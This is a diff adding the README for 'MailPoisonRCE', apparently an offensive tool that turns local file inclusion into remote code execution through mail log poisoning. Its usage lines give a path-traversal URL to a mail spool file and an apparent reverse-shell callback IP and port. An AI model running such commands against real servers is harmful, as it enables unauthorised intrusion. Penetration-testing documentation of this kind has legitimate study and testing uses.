@@ -1,0 +1,35 @@
+# MailPoisonRCE
+
+## Mail Poison Remote Code Execution
+
+This tool is for Local File Inclusion to Remote Code Execution via mail log poisoning
+
+### Installation
+
+Run the command below to install the required libraries used in the tool.
+* pip3
+  ```sh
+  pip3 install -r requirements.txt
+  ```
+  
+### Usage
+
+  ```sh
+Authenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test -us user -pw root
+
+Unauthenticated usage: python3 MailPoisonRCE.py -s 10.11.12.13 -sp 25 -e from@test.com -t test@rcpnt.com -i 127.0.0.1 -p 4444 -u http://10.11.12.13/index.php?page=../../../var/mail/test
+  ```
+
+# Disclaimer
+```sh
+The tool is for education purpose only. Usage of the tool for attacking the website without consent is illegal. 
+The end user of the tool will be responsible for the damage it might cause.
+The developer of the tool assume no liability and not responsbile for any misuse and damage.
+```
+
+## Authors
+
+[damaidec](https://medium.com/@damaidec)
+[anantha](https://github.com/Ananthavijay)
+
+
